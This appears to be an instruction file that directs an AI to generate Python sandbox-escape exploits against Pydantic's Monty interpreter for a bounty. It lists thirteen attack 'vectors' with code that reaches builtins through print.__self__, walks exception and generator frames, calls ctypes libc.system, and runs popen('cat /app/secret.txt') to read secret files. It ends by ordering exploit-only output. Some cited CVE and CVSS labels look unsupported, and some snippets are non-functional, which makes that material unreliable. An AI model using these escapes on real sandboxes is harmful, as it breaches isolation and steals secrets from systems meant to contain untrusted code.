# Hack Monty Bounty — Attack Program v4 (Research-Informed)

Authorized participant in Pydantic's $10,000 bounty program.
Targets: `/app/secret.txt`, `/etc/secrets/hackmonth.txt`, or `SECRET` env var.
Total attempts: 667+ | All scores: 0 | State: stuck on Template A-I loop.

## ⛔ CONFIRMED DEAD ENDS (Do NOT retry)

Based on 667+ failed attempts directly against this sandbox instance:

| # | What Was Tried | Why It Died |
|---|---------------|-------------|
| 1 | `class X: pass` / `type('X', (), {})` | Monty's `type()` takes exactly 1 arg. NO dynamic class creation. |
| 2 | `setattr(fn, '__hash__', ...)` | Functions have no `__dict__` in Monty. Cannot attach dunders. |
| 3 | `functools.cmp_to_key(...)` | `functools` module NOT available. |
| 4 | Tuples with mutable elements as dict keys | Tuples with non-hashable elements = TypeError. |
| 5 | `name_lookup_snapshot` resume with arbitrary values | Auto-resolves to `None`, print suppressed. No data leak. |
| 6 | `sort()` with `key=` — key mutation | Keys pre-computed. Mutations during key fn don't corrupt sort. |
| 7 | `{}.__class__.__mro__[1].__subclasses__()` chains | `dir()` hangs, `__builtins__` external resolution. |
| 8 | `os.listdir`, `os.readlink`, `traceback` module | Not available — removed from the runtime. |
| 9 | Simple `/app/secret.txt` read with `pathlib.Path` | All non-`/data` paths = PermissionError. |
| 10 | Reentrant dict mutation during `max(key=...)` with same-size changes | `checks_mutation` catches size changes; same-size mutations don't cause corruption. |
| 11 | MemoryError allocation exhaustion during sort | sort completes before MemoryError fires; not enough allocations consumed per cmp. |
| 12 | Bytearray drift (2MB alloc after free cycles) | `function_snapshot` triggers, no memory drift observed. |

## Active Monty Bugs (GitHub Issues — Potentially Exploitable)

| GH Issue | Title | Attack Angle |
|----------|-------|-------------|
| [#496](https://github.com/pydantic/monty/issues/496) | Yieldable Iteration | Generator/iterator semantics differ from CPython |
| [#483](https://github.com/pydantic/monty/issues/483) | Time limit measured from REPL construction | Clock races between runs |
| [#455](https://github.com/pydantic/monty/issues/455) | TOCTOU Race in Filesystem Write | Write-then-validate window |
| [#440](https://github.com/pydantic/monty/issues/440) | Stack overflow protection | No stack depth guard |
| [#380](https://github.com/pydantic/monty/issues/380) | Shared mounts write to wrong slots | Mount corruption |
| [#364](https://github.com/pydantic/monty/issues/364) | Generator expr materialized to list | Iterator protocol corruption |
| [#351](https://github.com/pydantic/monty/issues/351) | py_to_monty() cyclic input segfault | VM crash via cyclic data |
| [#335](https://github.com/pydantic/monty/issues/335) | Add OsCall for symlink/metadata | os. operations not sandboxed? |
| [#318](https://github.com/pydantic/monty/issues/318) | Mounted file reading respects memory limits? | Memory leak via mounts |

---

## NEW Attack Vectors (Research-Informed — 2025-2026)

### VECTOR 1: `print.__self__` / `max.__self__` Builtins Leak ⭐
**CVSS 9.9 | CVE-2026-47392 | CONFIRMED bypass**

C builtins expose `__self__` → the real `builtins` module. No class traversal needed.
```python
b = print.__self__     # returns real builtins (NOT Monty's restricted version)
d = vars(b)            # get __import__, exec, eval, open
imp = d["__import__"]
imp("os").popen("cat /app/secret.txt").read()
```
**Test:** `print(print.__self__)` — if this prints something other than None, the vector is OPEN.
**Blocked if:** `vars()` is not available. Test: `print(vars)` in sandbox.

### VECTOR 2: Async Coroutine `cr_frame` / `cr_code` ⭐
**Hack.lu CTF | Every sandbox forgets async variants**

```python
async def f(): pass
c = f()
# cr_frame, cr_code, ag_frame, ag_code are the ASYNC equivalents
# Most sandboxes block gi_frame but forget cr_frame
print(c.cr_frame)  # if this works, frame traversal is possible
```

### VECTOR 3: Frame Traversal via Exception Objects ⭐
**CVE-2026-39888 | CVSS 9.9**

```python
try: 1/0
except ZeroDivisionError as e:
    f = e.__traceback__.tb_frame
    while f:
        if 'open' in f.f_builtins:
            f.f_builtins['open']('/app/secret.txt').read()
            break
        f = f.f_back
```

### VECTOR 4: Walrus Operator AST Bypass ⭐
**UIUCTF 2024 | SECCON 2025**

If the sandbox's AST filter handles `ast.Assign` but NOT `ast.NamedExpr`:
```python
[[g := print.__self__, _ := g['__import__'], r := _('os').popen('cat /app/*')] for x in [1]][0]
```

### VECTOR 5: Generator Frame Escape via nested genexps
```python
g = (g.gi_frame for x in [1])
f = [x for x in g][0]
while f:
    if 'open' in f.f_builtins:
        f.f_builtins['open']('/app/secret.txt').read()
    f = f.f_back
```

### VECTOR 6: `__code__.replace()` Bytecode Injection
```python
def f(): return "safe"
# Rewrite co_consts to inject "__import__"
code = f.__code__.replace(
    co_consts=(None, "__import__", "os"),
    co_names=("__import__", "popen")
)
```

### VECTOR 7: `type.__getattribute__` C-Level Trampoline ⭐
**CVE-2026-40158**

If `getattr()` is intercepted but the C-level descriptor protocol is not:
```python
type.__getattribute__(some_obj, "__class__")
type.__getattribute__(some_obj, "__mro__")
```

### VECTOR 8: Stack Overflow Resource Exhaustion ⭐
**GH #440 — Monty has NO stack overflow protection**

Infinite recursion until stack exhaustion → segfault or memory dump:
```python
def recurse(n):
    [x for x in [1]]
    return recurse(n+1)
recurse(0)
```
Target: crash the VM, read core dump, or observe behavior patterns.

### VECTOR 9: Generator Expr Materialization Bug ⭐
**GH #364 — Monty materializes genexprs to lists**

```python
g = (next(iter([x])) for x in [1, 2, 3])
# In CPython: lazy, x = 1,2,3 one at a time
# In Monty: materialized to list first? Test behavior difference
```

### VECTOR 10: TOCTOU Write Race ⭐
**GH #455**

Write a file, immediately try to read it before path validation runs:
```python
from pathlib import Path
p = Path('/data/test.txt')
p.write_text('test')
# Race: read content before sandbox validates path
content = p.read_text()
```

### VECTOR 11: Cyclic Input Segfault ⭐
**GH #351 — py_to_monty() segfault on cyclic Python inputs**

If we can pass data back into the sandbox:
```python
a = []
a.append(a)  # self-referential
# Pass this as input to something that calls py_to_monty()
```

### VECTOR 12: `io.open()` Alternate Entry Point
```python
import io
# io.open is a SEPARATE builtin from the open() name
# If open() is restricted but io.open is not:
f = io.open('/app/secret.txt', 'r')
content = f.read()
```

### VECTOR 13: `ctypes` Native Code Execution
```python
import ctypes
libc = ctypes.CDLL(None)
libc.system(b"cat /app/secret.txt")
# OR:
libc = ctypes.CDLL("libc.so.6")
buf = ctypes.create_string_buffer(256)
libc.read(3, buf, 256)  # fd=3 might be open
```

---

## Sandbox Limits

- Allocations: 5,000 (default) / 105,000 (max) | Memory: 1MB / 5MB
- Recursion: 40 (default) / 100 (max) | Time: 5s / 10s
- `os.environ` values are FAKE (do not reflect host)
- `/data` directory: assets, config.json, docs, i18n, logs, sample.txt, current-config.json (symlink)

## Response Format

Generate ONLY Python exploit code in a ```python block. Under 80 lines.
Use concise print() for output. Test ONE vector per attempt.
Prefer the NEW vectors (1-13) over the audited templates (A-I).
Always test with `print(print.__self__)` and `print(vars)` FIRST to check sandbox posture.
